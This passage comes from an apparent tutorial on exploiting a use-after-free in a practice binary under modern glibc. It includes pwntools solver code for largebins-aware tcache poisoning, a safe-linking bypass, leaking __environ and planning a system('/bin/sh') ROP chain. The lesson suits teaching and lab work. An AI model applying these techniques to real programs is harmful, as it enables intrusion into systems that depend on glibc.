The reason for the comment above about the structure being a "misleading" view is that the `malloc_chunk` address is _not_ what is returned by `malloc`—the address returned is actually `0x10` bytes into the `malloc_chunk` struct. We know this because this is the location of `fd` (what gef and these lessons call `fw`), which is always the first quadword in the data, and `mchunk_size`, which is the `size | FLAGS` field, is `0x8` bytes before that.

We note the comment about `fd_nextsize` and `bk_nextsize` only used for large blocks, if free. This equates to "largebins allocations." This is essentially _another_ doubly linked list (a bit redundant, don't you think?) that points to the heap address of the next item in the list. More precisely, it points to the `malloc_chunk` of the next allocation, which is the address `0x10` bytes before the data buffer that we're familiar with. Since we only have one item in the largebins cache, both these pointers point to `&large - 0x10`.

This is important to note when we deal with largebins allocations! We might have expected them to behave exactly like unsorted bins (which actually is the case for smallbins allocations), but they have a bit of a different structure that may need to be accounted for during exploitation.  Understanding this structure is important to passing various checks if we corrupt a largebins cached allocation, either by choice or necessity. We will leverage this knowledge in the following practical example to avoid a crash during exploitation.

## Practical Example

Let's demonstrate this attack strategy from start to finish on the [[uaf_22.04]] binary. But first, we'll discuss some small changes to the target binary compared to last lesson's [[uaf]] and understand why they were made. We can diff the [[uaf_22.04.c]] source code to see exactly what is different:

```diff
--- uaf.c	2024-08-11 18:06:19.636450139 +0000
+++ uaf_22.04.c	2024-08-11 18:06:13.908220842 +0000
@@ -35,7 +35,7 @@
 void edit() {
     if (u) {
         puts("Enter a name:");
-        fgets(u->name, 0x10, stdin);
+        read(0, u->name, 0x10);
         char* c = strchr(u->name, '\n');
         if (c) { *c = '\0'; }
         puts("Enter a group:");
@@ -80,12 +80,21 @@
     logged_in = false;
 }
 
+void ticket() {
+    char* ticket = malloc(0x500);
+    puts("Please write a ticket for the sysadmin: ");
+    fgets(ticket, 0x500, stdin);
+    puts("Ticket submitted, we will be in touch shortly");
+    free(ticket);
+}
+
 long menu() {
     puts("Please enter an option:");
     puts(" 1. New user");
     puts(" 2. Edit user");
     puts(" 3. Print user");
     puts(" 4. Delete user");
+    puts(" 5. Submit ticket for admin");
     printf(" > ");
     fflush(stdout);
     char buf[0x10];
@@ -93,9 +102,9 @@
     return strtol(buf, NULL, 10);
 }
 int main() {
-    setvbuf(stderr, NULL, _IOLBF, 0);
-    setvbuf(stdout, NULL, _IOLBF, 0);
-    setvbuf(stdin, NULL, _IOLBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
     while (1) {
         long choice = menu();
         switch (choice) {
@@ -111,6 +120,9 @@
         case 4:
             delete();
             break;
+        case 5:
+            ticket();
+            break;
         default:
             break;
         }
```

### How to Handle Bad Luck

The biggest difference is the addition of the user ticket, which allocates and frees a `0x500`-byte buffer. This buffer helps us handle a condition where we are "unlucky" during exploitation.

What behavior does this new code introduce? It is a very large allocation, larger than anything else in the program. Whenever this allocation is requested, the program checks if it fits in tcache or fastbins—but it does not because it is too large—and then checks largebins and unsorted bins. There is no real situation where the program could have an allocation this large available (the small allocations will always end up in tcache, and `bio` is not large enough), so the returned allocation is pulled from `top_chunk`. But, before it returns from `malloc`, glibc [sorts the unsorted bins](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L4070) into the respective smallbins or largebins. Therefore, a freed `bio` [moves from unsorted bins to largebins](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L4186).

Why is this important? The short answer is bad luck. The long answer is that it just so happens that the linked list pointer to `main_arena` for unsorted bins, which is stored in `bio` when freed, ends with a `0x00` byte for `Ubuntu GLIBC 2.38-1ubuntu6.3`. When the program attempts to print the previously-freed `bio` data, it runs into this null-pointer and thinks it is the end of the string, preventing our glibc leak! This is unfortunately not randomized behavior because it has to do with the alignment of `malloc_state` (`main_arena`) in the compiled glibc library, so the address stored in `bio`'s `fw` and `bk` pointer will _always_ end `0x00` for this version of glibc.

```
──────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x55790befa780, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55790befa760, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
Tcachebins[idx=1, size=0x30, count=1] ←  Chunk(addr=0x55790befa2a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
───────────────────── Fastbins for arena at 0x7fc75f5feca0 ──────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────── Unsorted Bin for arena at 0x7fc75f5feca0 ────────────────────
[+] unsorted_bins[0]: fw=0x55790befa2c0, bk=0x55790befa2c0
 →   Chunk(addr=0x55790befa2d0, size=0x490, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7fc75f5feca0 ─────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────── Large Bins for arena at 0x7fc75f5feca0 ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/2xg 0x55790befa2d0
0x55790befa2d0: 0x00007fc75f5fed00      0x00007fc75f5fed00
gef➤  x/4xg 0x00007fc75f5fed00
0x7fc75f5fed00 <main_arena+96>: 0x000055790befa790      0x0000000000000000
0x7fc75f5fed10 <main_arena+112>:        0x000055790befa2c0      0x000055790befa2c0
```

Forcing glibc to sort unsorted bins moves `bio` into its respective bin, index 65, meaning its `fw` and `bk` pointers now point to `main_arena->bins[65]`. This does not end in `0x00`, as shown below, and can be successfully leaked.

```
─────────────────── Unsorted Bin for arena at 0x7fc75f5feca0 ────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7fc75f5feca0 ─────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────── Large Bins for arena at 0x7fc75f5feca0 ────────────────────
[+] large_bins[65]: fw=0x55790befa2c0, bk=0x55790befa2c0
 →   Chunk(addr=0x55790befa2d0, size=0x490, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/2xg 0x55790befa2d0
0x55790befa2d0: 0x00007fc75f5ff110      0x00007fc75f5ff110
gef➤  x/4xg 0x00007fc75f5ff110
0x7fc75f5ff110 <main_arena+1136>:       0x00007fc75f5ff100      0x00007fc75f5ff100
0x7fc75f5ff120 <main_arena+1152>:       0x000055790befa2c0      0x000055790befa2c0
```

This is bad luck, but it's also something we should know how to solve. Due to randomization, there is always a 1/16 chance that the last byte of an allocation ends in `0x00` (the last nibble is always 0, and the second last nibble has a 1/16 chance of being zero). What happens if this occurs? It depends on the scenario and the control we have.

If this happens when we leak a cached `fw` pointer, such as in tcache for glibc <2.32, this means the next allocation in the list ends in a `0x00`. We could try leaking a different pointer in the list. If we have control over the size of the items in the cache, we could increase or decrease that size until we end up in a differently sized bin. The changes to the allocation sizes means they will shift up or down on the heap and will likely resolve the issue of the desired leak ending in `0x00`. This same tactic works for smallbins and largebins allocations, if we have control over their size. 

If a targeted tail allocation's `fw` pointer leak in glibc 2.32+ fails to leak, this means that eight consecutive bits are 0. This has an extremely low likelihood—the eight straight 0 bits cannot just occur in sequence, they must be aligned to a byte boundary (after shifting). This probability is so low, it would likely be deemed an acceptable risk for any real-world exploit. It certainly is not worth worrying about for our work.

If the leak is the unsorted bin's glibc pointer, as in our example, we could force sorting of the allocations so that the pointer changes to a different glibc address. This is the strategy leveraged by the `ticket` allocation in our new target.

If we have an arbitrary one-byte (or more) write at our disposal, we could try writing a printable character, such as `A`, to the least-significant byte in the address. This may have adverse effects—and we should probably set it back to `0x00` after trying the leak again—but putting a printable character in that byte will likely allow us to leak the rest of the address after the clobbered null byte.

In the worst case scenario, we could try exploiting the process after a reboot when randomization has changed. This is not ideal but might be the most reliable/safest option in certain circumstances. 

### Other Tweaks

We make two other tweaks to make exploitation a bit easier, since this is already a difficult target binary. The first is a rather simple change: configuring the file descriptor buffers to `_IONBF` (not buffered). Any other buffering choice for these streams results in heap allocations to manage the buffer, which is not a dealbreaker but does muck up the heap. The result of `_IOLBF` would be a `0x1000` byte allocation stuck between our program's heap allocations, and our leaked heap address would likely not be on the same page as the start of the heap. We could easily adjust for this with some simple subtraction, but it's best to just remove it from the program for simplicity.

The last change is changing the input call for `u->name` from `fgets` to `read`. This is to make exploitation a bit easier, since `fgets` reads _at most_ one less than the read length to make room for a terminating null byte. Changing this call to `read` means we can use `p64` without worrying about trailing bytes being ignored by the input call.

With that understanding, we are now ready to develop and test an exploitation strategy for this binary using modern glibc.

### Exploitation Strategy

Before starting our exploit, we'll leverage the same solver script from the last lesson as a template. We make a few changes based on the above changes to the binary, including sending the `name` without a newline character and making a new `ticket` helper function:

```diff
--- uaf_solver.py	2024-08-11 18:46:04.531550338 +0000
+++ uaf_22.04_solver.py	2024-08-11 18:46:10.291772065 +0000
@@ -1,10 +1,12 @@
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h", "-f"]
 
-p = gdb.debug("./uaf", '''
+p = gdb.debug("./uaf_22.04", '''
     b new
     continue
 ''')
 
@@ -14,7 +16,7 @@
 
 def __edit(name, group, uid, gid, bio):
     p.recvuntil(b"name:\n")
-    p.sendline(name)
+    p.send(name)
     p.recvuntil(b"group:\n")
@@ -37,30 +39,85 @@
     p.sendline(b'4')
     p.recvuntil(b" >")
 
+def ticket(ticket):
+    p.sendline(b'5')
+    p.recvuntil(b": ")
+    p.sendline(ticket)
+    p.recvuntil(b" >")
+
 p.recvuntil(b"> ")
```

#### Breaking ASLR for glibc and the Heap

Our first thought is likely to try a similar approach as last lesson's example with an added step of leaking `__environ`'s value (since `__free_hook` is no more). This may very well be a valid strategy for certain targets. However, this binary provides us very limited control over allocation and freeing. In fact, things would get very dicey after leaking `__environ`:

* Because `__environ` is eight-byte aligned, we must allocate a buffer at least `0x8` bytes before it—otherwise glibc will [crash due to an unaligned allocation](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L3182)
* Making our poisoned allocation `0x8` bytes before `__environ`  is problematic and results in its value being nulled-out—that offset is assumed to contain `tcache_key`, as mentioned previously
* We could still perhaps still leak its value after poisoning tcache, but subsequent calls to freeing the previously poisoned pointer near `__environ` would [fail size some "little security checks" in glibc](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/malloc/malloc.c#L4510)—glibc expects that allocations are preceded by a valid size!

Challenges like these are common whenever we've poisoned a cache and the heap state has diverged from the norm. Things are liable to go haywire quickly.

We need a tcache corruption target that provides a lot of control. Something that lets us set pointers which we can use to leak info and write long buffers (like a ROP chain). An option that jumps out is control over `u`! With the ability to overwrite the `name`, `group`, and `bio` pointers in `u`, we could `print` or `edit` the chosen data repeatedly without calling `new` or `delete` to further corrupt the heap state.

We can achieve initial control over `u` by making it the target of our tcache poisoning. The first steps are the same as last lesson's example: we make a new user and delete it to set up a UAF vulnerability. But, `print`ing the value at this point does not leak a glibc address because of the null byte in `bio`'s `fw` pointer. Instead, we need to allocate the large `ticket` buffer to trigger sorting so that the freed `bio` allocation points to a new glibc address. Also, our target for the heap leak is the value in `group->fw`'s pointer, as that is the shifted but un-XORed tail pointer. Parsing these two values (and shifting the leaked `group->fw` pointer) leaks our glibc base and heap base:

```python
p.recvuntil(b"> ")

# register items on heap
new(b"ian", b"user", 1000, 1000, b"prof")

# leak glibc and heap addresses
# make ticket to sort unsorted bins so that we print a glibc address back
delete()
ticket(b"Can't log in! Help!")
leak = _print()
# get leaked group pointer which is just (&group >> 12)
heap_leak = leak[leak.find(b"group: ") + len(b"group: "):]
heap_leak = leak[leak.find(b"group: ") + len(b"group: "):]
heap_leak = heap_leak[:heap_leak.find(b',')]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
glibc_leak = leak[leak.find(b"Bio: ") + len(b"Bio: "):]
glibc_leak = glibc_leak[:glibc_leak.find(b'P')]
glibc_leak = u64(glibc_leak.ljust(8, b'\x00'))

heap_base = (heap_leak << 12) & ~0xfff
glibc_base = (glibc_leak & ~0xfff) - 0x1ff000
print("Heap base: " + hex(heap_base))
print("Glibc base: "  + hex(glibc_base))
```

```
[DEBUG] Received 0x52 bytes:
    00000000  55 73 65 72  3a 20 ae 79  c9 3b 27 56  2c 20 67 72  │User│: ·y│·;'V│, gr│
    00000010  6f 75 70 3a  20 ce 9e 25  62 05 2c 20  75 69 64 3a  │oup:│ ··%│b·, │uid:│
    00000020  20 32 33 31  32 31 34 36  39 31 33 34  2c 20 67 69  │ 231│2146│9134│, gi│
    00000030  64 3a 20 34  34 32 32 39  37 36 30 30  35 38 38 35  │d: 4│4229│7600│5885│
    00000040  34 30 32 34  31 34 0a 42  69 6f 3a 20  10 f1 1f 34  │4024│14·B│io: │···4│
    00000050  09 7f                                               │··│
    00000052
[DEBUG] Received 0x17 bytes:
    b'Please enter an option:'
[DEBUG] Received 0x5a bytes:
    b'\n'
    b' 1. New user\n'
    b' 2. Edit user\n'
    b' 3. Print user\n'
    b' 4. Delete user\n'
    b' 5. Submit ticket for admin\n'
    b' > '
Heap base: 0x562259ece000
Glibc base: 0x7f0934000000
```

#### Poisoning Tcache and Fighting Crashes

Great! Step one is done, now we must corrupt tcache with an arbitrary address. We want to control `u` because it contains UAF pointers, and modifying those pointers gives us arbitrary read and write capabilities with `print` and `edit`, respectively. But we should be strategic about what address we choose. We only want to poison tcache once so that we avoid touching the heap after corruption. And the only option we have for poisoning tcache is the `0x20` sized cache. The poisoned address is returned for the `name` buffer, just like we saw in the <2.32 example. Any subsequent edit to `name` is limited by the program to `0x10` bytes, which is only two quadwords of control. The first two quadwords of `u` are just the `u->uid` and `u->gid` values, so we do not want to poison the cache with `u`'s starting address. Instead, we should shift our target to `u+0x10`, which lets us overwrite the `u->name` and `u->group` pointers.

We can use `heap chunks` with `gef` to discern the offset of all allocations from the start of the heap, including `u`. We need two pieces of information to bypass safe linking: the address of the cached allocation we plan to overwrite and the target (poisoned) address. The cached allocation must be a non-tail allocation, which means the cached `name` allocation is the goal (`name` points to `group` in the cache, the same as last lesson). We concluded the target poisoned address is `u + 0x10`. With these two pieces of information, we can calculate the "encrypted" pointer such that the "decryption" shows the address of `u`. Let's store this value in `name`'s `fw` address by editing its value:

```python
# corrupt tcache (head of list) to point into `u`
e = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
e.address = glibc_base
system = e.symbols.system
bin_sh = next(e.search(b"/bin/sh"))
environ = e.symbols.__environ
u = 0x2a0 + heap_base
bio = 0x2d0 + heap_base
name = 0x780 + heap_base
group = 0x760 + heap_base
target_overwrite = (name >> 12) ^ (u + 0x10)
edit(p64(target_overwrite),
    b"BBBB",
    10,
    10,
    p64(glibc_leak) + p64(glibc_leak))
```

We should check our bins before calling `new` to make sure that they are corrupted appropriately. 

```
──────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x558d63cf7780, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x558d63cf72b0, size=0x8, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x558d63cf72b0]
Tcachebins[idx=1, size=0x30, count=1] ←  Chunk(addr=0x558d63cf72a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x558d63cf72a0]
```

Great! Now we're ready to create a new user to fetch the corrupted cached allocations. We can create a new allocation, but we need to be strategic with the values written to the new buffers. `u->name` points now to `u + 0x10`...which is actually itself! So after allocating the buffers in `new,` `u->name`'s new name overwrites its own pointer (and `group`'s pointer, if we so choose). Let's make `u->name` equal to `__environ`'s address so we can leak its value with `print`:

```python
edit(p64(target_overwrite),
    b"BBBB",
    10,
    10,
    p64(glibc_leak) + p64(glibc_leak))
new(p64(environ), b"BBBB", 10, 10, b"AAAA")
leak = _print()
```

Let's run it to check if this holds...

```console
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f55c76a47a9 <unlink_chunk.isra+0049> mov    rdx, QWORD PTR [rdi+0x20]
   0x7f55c76a47ad <unlink_chunk.isra+004d> test   rdx, rdx
   0x7f55c76a47b0 <unlink_chunk.isra+0050> je     0x7f55c76a47d1 <unlink_chunk+113>
 → 0x7f55c76a47b2 <unlink_chunk.isra+0052> cmp    rdi, QWORD PTR [rdx+0x28]
   0x7f55c76a47b6 <unlink_chunk.isra+0056> jne    0x7f55c76a482e <unlink_chunk+206>
   0x7f55c76a47b8 <unlink_chunk.isra+0058> mov    rcx, QWORD PTR [rdi+0x28]
   0x7f55c76a47bc <unlink_chunk.isra+005c> cmp    rdi, QWORD PTR [rcx+0x20]
   0x7f55c76a47c0 <unlink_chunk.isra+0060> jne    0x7f55c76a482e <unlink_chunk+206>
   0x7f55c76a47c2 <unlink_chunk.isra+0062> cmp    QWORD PTR [rax+0x20], 0x0
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf_22.04", stopped 0x7f55c76a47b2 in unlink_chunk (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f55c76a47b2 → unlink_chunk(p=0x5620557352c0, av=0x7f55c77feca0 <main_arena>)
[#1] 0x7f55c76a6f69 → _int_malloc(av=0x7f55c77feca0 <main_arena>, bytes=0x480)
[#2] 0x7f55c76a82ca → __GI___libc_malloc(bytes=<optimized out>)
[#3] 0x562054aba324 → new()
[#4] 0x562054aba82e → main()
─────────────────────────────────────────────────────────────────────────────────
```

Hmm. We get a crash when allocating from the caches, specifically in the `unlink_chunk` function. This is called for smallbins and largebins allocations, meaning there is something wrong with our `bio` data. The script above treats `bio`'s overwrite like it is an unsorted bins allocation, as it was in last lesson's example. But now it is in largebins. As mentioned earlier, largebins allocations have a different structure, specifically two pointers to `0x10` bytes before their data in the third and fourth quadword. We can break after sorting `bio` to see what its data should look like when uncorrupted:

```
───────────────────── Large Bins for arena at 0x7efd927feca0 ────────────────────
[+] large_bins[65]: fw=0x5584f7e012c0, bk=0x5584f7e012c0
 →   Chunk(addr=0x5584f7e012d0, size=0x490, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/4xg 0x5584f7e012d0
0x5584f7e012d0: 0x00007efd927ff110      0x00007efd927ff110
0x5584f7e012e0: 0x00005584f7e012c0      0x00005584f7e012c0 < pointers to address - 0x10
gef➤  x/4xg 0x00005584f7e012c0
0x5584f7e012c0: 0x00005584f7e012d0      0x0000000000000491
0x5584f7e012d0: 0x00007efd927ff110      0x00007efd927ff110
```

This shows that we need to overwrite four quadwords in `bio`: the glibc leak, the glibc leak, the address right before `bio`, and the address right before `bio`, in that order. This maintains the values already in the `bio` cached allocation, and reallocating it later avoids a crash in `new`:

```python
edit(p64(target_overwrite),
    b"BBBB",
	10,
    10,
    p64(glibc_leak) + p64(glibc_leak) + p64(bio - 0x10) + p64(bio - 0x10)
new(p64(environ), b"BBBB", 10, 10, b"AAAA")
leak = _print()
```

But running with this update now shows a crash in `edit`:

```
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fefcc682a63 <_IO_getline_info+00b3> cmp    r12d, eax
   0x7fefcc682a66 <_IO_getline_info+00b6> je     0x7fefcc682b0b <__GI__IO_getline_info+347>
   0x7fefcc682a6c <_IO_getline_info+00bc> sub    r13, 0x1
 → 0x7fefcc682a70 <_IO_getline_info+00c0> mov    BYTE PTR [rbp+0x0], al
   0x7fefcc682a73 <_IO_getline_info+00c3> add    rbp, 0x1
   0x7fefcc682a77 <_IO_getline_info+00c7> test   r13, r13
   0x7fefcc682a7a <_IO_getline_info+00ca> jne    0x7fefcc682a42 <__GI__IO_getline_info+146>
   0x7fefcc682a7c <_IO_getline_info+00cc> nop    DWORD PTR [rax+0x0]
   0x7fefcc682a80 <_IO_getline_info+00d0> mov    rax, rbp
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf_22.04", stopped 0x7fefcc682a70 in __GI__IO_getline_info (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7fefcc682a70 → __GI__IO_getline_info(fp=0x7fefcc7feac0 <_IO_2_1_stdin_>, buf=0x0, n=0xf, delim=0xa, extract_delim=0x1, eof=0x0)
[#1] 0x7fefcc682b5c → __GI__IO_getline(fp=0x7fefcc7feac0 <_IO_2_1_stdin_>, buf=0x0, n=0xf, delim=0xa, extract_delim=0x1)
[#2] 0x7fefcc681720 → _IO_fgets(buf=0x0, n=0x10, fp=0x7fefcc7feac0 <_IO_2_1_stdin_>)
[#3] 0x55a40029441a → edit()
[#4] 0x55a40029435c → new()
[#5] 0x55a40029482e → main()
```

At this point we might be at our wits end, but it is important not to panic. We're making progress and understanding more about the program and the system than we previously knew. These are opportunities to take a step back and assess our assumptions. 

Stepping through `edit`, we see it is crashing when trying to read into `group`. This is because the allocation for `name` (which occurs after allocating `group`) returns a pointer to `u + 0x10` (`u->name`). `group`'s pointer is at `u + 0x18`, which is the second quadword in the retrieved allocation. When `tcache_get` fetches the cached (and poisoned) allocation, this leads to `u->group` being nulled out (glibc assumes `tcache_key` lived there!). We then end up attempting the call `fgets(0, 0x10, stdin)`, which of course crashes due to a null-dereference.

```
gef➤  x/xg &u
0x55a400297058 <u>:     0x000055a4011422a0
gef➤  x/6xg 0x000055a4011422a0
0x55a4011422a0: 0x000000000000000a      0x000000000000000a
0x55a4011422b0: 0x00007fefcc806258      0x0000000000000000 < u->group
0x55a4011422c0: 0x000055a4011422d0      0x0000000000000491
```

We need to assess what control we have. We could change the address that we corrupt to return `u + 0x20` instead. This could work. But we also notice that we read `name`'s value _before_ `group` in `edit`. This means we have an opportunity to change `group`'s pointer before it is used! Let's make it a valid address, such as itself. With this change we successfully get around the crash by making `group` a valid pointer.

```python
edit(p64(target_overwrite),
    b"BBBB",
    10,
    10,
    p64(glibc_leak) + p64(glibc_leak) + p64(bio-0x10) + p64(bio-0x10))
new(p64(environ) + p64(group), b"BBBB", 10, 10, b"AAAA")
leak = _print()
stack_leak = leak[leak.find(b"User: ") + len(b"User: "):]
stack_leak = stack_leak[:stack_leak.find(b',')]
stack = u64(stack_leak.ljust(8, b'\x00'))
print("__environ value: " + hex(stack))
```

```
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0xa6 bytes:
    00000000  55 73 65 72  3a 20 58 f8  71 e8 fd 7f  2c 20 67 72  │User│: X·│q···│, gr│
    00000010  6f 75 70 3a  20 42 42 42  42 2c 20 75  69 64 3a 20  │oup:│ BBB│B, u│id: │
    00000020  31 30 2c 20  67 69 64 3a  20 31 30 0a  42 69 6f 3a  │10, │gid:│ 10·│Bio:│
    00000030  20 41 41 41  41 50 6c 65  61 73 65 20  65 6e 74 65  │ AAA│APle│ase │ente│
    00000040  72 20 61 6e  20 6f 70 74  69 6f 6e 3a  0a 20 31 2e  │r an│ opt│ion:│· 1.│
    00000050  20 4e 65 77  20 75 73 65  72 0a 20 32  2e 20 45 64  │ New│ use│r· 2│. Ed│
    00000060  69 74 20 75  73 65 72 0a  20 33 2e 20  50 72 69 6e  │it u│ser·│ 3. │Prin│
    00000070  74 20 75 73  65 72 0a 20  34 2e 20 44  65 6c 65 74  │t us│er· │4. D│elet│
    00000080  65 20 75 73  65 72 0a 20  35 2e 20 53  75 62 6d 69  │e us│er· │5. S│ubmi│
    00000090  74 20 74 69  63 6b 65 74  20 66 6f 72  20 61 64 6d  │t ti│cket│ for│ adm│
    000000a0  69 6e 0a 20  3e 20                                  │in· │> │
    000000a6
__environ value: 0x7ffde871f858
```

We have a stack leak! Let's appreciate the progress thus far and take a step back to consider our next moves.

#### Choosing a Pushed Instruction Pointer

The previous lecture content focused on overwriting the address of `main`'s pushed instruction pointer, which is valuable when the program naturally returns from main or we can force a clean exit. However, this program is an infinite loop with no option to "quit." What do we do in such a scenario? Our best option is to choose a different function return to corrupt, one we know will eventually return.

Our options are any of the functions called from `main`, or their sub-function calls. We will presumably corrupt the stack during a call to `edit` with one of our buffers pointing to the stack address of choice. Therefore, targeting `edit`'s pushed instruction pointer should hijack control when we complete our edits. But, `edit` is called in two different spots: from `new` and from `main`. It's important to distinguish which one we want, since the call stacks are different—calling `main -> new -> edit` will lead to a different stack frame address than `main -> edit`.

At this point our heap state is very brittle, and calling `new` is a big risk; we would prefer to avoid `malloc`ing and `free`ing any allocations for the rest of this exploit, if possible. That means we should target the overwrite choosing the `edit` option directly from `main`. We can calculate the offset of `edit`'s stack frame from `__environ`'s value by breaking in GDB whenever we enter `main -> edit`:

```
gef➤  b edit
gef➤  c
─────────────────────────────────────────────────────────────────────────────────
[#0] 0x562bbd72a372 → edit()
[#1] 0x562bbd72a83a → main()
─────────────────────────────────────────────────────────────────────────────────
gef➤  bt
#0  0x0000562bbd72a372 in edit ()
#1  0x0000562bbd72a83a in main ()
gef➤  x/4xg $sp
0x7ffd129e6c10: 0x00007ffd129e6c30      0x0000562bbd72a83a
0x7ffd129e6c20: 0x0000000000000000      0x0000000000000002
gef➤  x/4i 0x0000562bbd72a83a
   0x562bbd72a83a <main+182>:   jmp    0x562bbd72a861 <main+221>
   0x562bbd72a83c <main+184>:   mov    eax,0x0
   0x562bbd72a841 <main+189>:   call   0x562bbd72a557 <print>
   0x562bbd72a846 <main+194>:   jmp    0x562bbd72a861 <main+221>
gef➤  p/x &__environ
$1 = 0x7f6792cf82c0
gef➤  x/xg 0x7f6792cf82c0
0x7f6792cf82c0 <environ>:       0x00007ffd129e6d58
gef➤  p/x 0x00007ffd129e6d58-0x7ffd129e6c18
$2 = 0x140
```

Shown above, we first confirm that the backtrace is just `main -> edit`, and then dump the current stack. Since we break on `edit` directly, we stop execution immediately after the prologue but before any stack is allocated for the frame. Thus, we see that the first two quadwords on the stack are the pushed base pointer and the pushed instruction pointer, as confirmed by the command `x/4i 0x0000562bbd72a83a`. Next, we get the address and then value of `__environ`, which is a stack address. Finally, we calculate the offset between `__environ`'s value and the pushed stack pointers, which is `0x140` bytes.

```python
STACK_OFFSET = 0x140 
edit_return = stack - STACK_OFFSET
print("`edit` pushed instruction pointer: " + hex(edit_return))
```

#### Final Corruption and ROP Chain

We're almost there—we just need to gain control over the stack and write a ROP chain to it. Let's start with the end in mind: we need to write a ROP chain to the stack and hijack `edit`'s pushed return instruction pointer. We want to leverage control over pointers in `u` and use `edit` to write the chain. What pointer should we use?

It's possible we could one-shot the corruption with a single gadget: a jump to a one-gadget to spawn a shell. But if we don't get lucky with our state entering that gadget, we might need a handful of quadwords with `pop; ret` gadgets to manipulate required registers. Let's play it safe and assume we need five or six quadwords. The `read` and `fgets` calls for `name` and `group`, respectively, only offer us `0x10` bytes of input. This is a pretty significant limitation. Meanwhile, `bio` has a buffer of `0x480` bytes—more than enough for writing a ROP chain to spawn a shell. 

We conclude that we should corrupt `u->bio` so that it points to the destination stack address and assemble a ROP chain while editing `bio`. The ROP chain is fairly simple, something like `pop rdi; pointer to "/bin/sh"; system` to call `system("/bin/sh");`. 

So we have a target address that we want in `u->bio`, but how do we get it there? We're in a bit of a predicament as `u->name` now has the address of `__environ`, which is not a valid heap allocation. If we try to `delete` the user and re-poison tcache, glibc will check this `__environ` address and realize it does not look like a valid heap allocation. Furthermore, none of our pointers currently point to `u`—we lost the previously held control over manipulating its data. This is not ideal.

There is an easy solution. In order to keep control of `u`, we can change the value that we assign to `u->group`. Remember that we assigned `u->group = &group` to make sure it was writable memory and avoid a crash; there was no other point in overwriting that address. Instead, we want  `u->group = &u->bio` so that we can change `u->bio`'s address after the leak. We won't know the desired address at the point of our `new` call, so we must wait until after the `print` call (stack leak) to perform the overwrite. Also, we want to avoid a crash like we previously experienced when `u->group` was some non-accessible address. Let's temporarily assign `bio` to the heap buffer it originally occupied, keeping everything in sync.

```python
new(p64(environ) + p64(u + 0x20), p64(bio), 10, 10, b"AAAA")
leak = _print()
stack_leak = leak[leak.find(b"User: ") + len(b"User: "):]
stack_leak = stack_leak[:stack_leak.find(b',')]
stack = u64(stack_leak.ljust(8, b'\x00'))
print("__environ value: " + hex(stack))
edit_return = stack - STACK_OFFSET
print("`edit` pushed instruction pointer: " + hex(edit_return))
```

This updated code still leaks `__environ`, and `u->group` now points to `&u->bio` to maintain control!

```console
gef➤  x/xg &u
0x55de980e1058 <u>:     0x000055de99a482a0
gef➤  x/5 0x000055de99a482a0
0x55de99a482a0: 0x000000000000000a      0x000000000000000a
0x55de99a482b0: 0x00007fa039606258      0x000055de99a482c0 < u->group = &u->bio
0x55de99a482c0: 0x000055de99a482d0      < u->bio
```

Ok great! Now we have a stack leak and still have control over `u`'s data through `u->group`. We can now edit `u->group` to change the pointer of `u->bio`, and then edit `u->bio` to write the ROP chain.

There is one final consideration: the edit to `u->name`. Right now it points to `__environ`...do we care if we clobber that address? The answer unfortunately is _yes_. It turns out that the call to `system`, which calls `do_system`, in turn calls `__posix_spawn`. The [sixth argument to this call](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/posix/system.c#L152) is actually the current `__environ` variable! So, corrupting its data certainly affects our ability to spawn a shell.

